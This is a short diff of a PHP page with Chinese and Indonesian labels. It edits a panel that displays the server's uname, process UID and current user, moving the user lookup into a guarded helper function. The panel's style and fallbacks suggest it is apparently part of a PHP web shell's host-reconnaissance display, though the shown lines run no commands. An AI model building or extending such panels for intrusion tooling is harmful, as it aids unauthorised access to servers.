@@ -860,29 +860,23 @@ a {
     <div class="system-info-left">
         <p>
             <strong style="color: #00aaff;">系统信息:</strong>
+            <span style="color: #ffffff;"><?php echo htmlspecialchars(php_uname()); ?></span>
+        </p>
+        <p>
+            <strong style="color: #00aaff;">用户:</strong>
             <span style="color: #ffffff;"><?php
-function get_system_info_safe() {
+function safe_user_info() {
     try {
-        if (function_exists('php_uname')) {
-            return php_uname();
-        } elseif ($os = getenv('OS')) {
-            return $os;
-        } elseif (defined('PHP_OS')) {
-            return PHP_OS;
-        } else {
-            return "Dinonaktifkan";
-        }
+        $uid = function_exists('getmyuid') ? getmyuid() : '未知UID';
+        $user = function_exists('get_current_user') ? get_current_user() : '未知用户';
+        return $uid . " (" . $user . ")";
     } catch (Throwable $e) {
         return "Dinonaktifkan";
     }
 }
-echo htmlspecialchars(get_system_info_safe());
+echo htmlspecialchars(safe_user_info());
 ?></span>
 
-        </p>
-        <p>
-            <strong style="color: #00aaff;">用户:</strong>
-            <span style="color: #ffffff;"><?php echo getmyuid() . " (" . get_current_user() . ")"; ?></span>
         </p>
         <p>
             <strong style="color: #00aaff;">组:</strong>
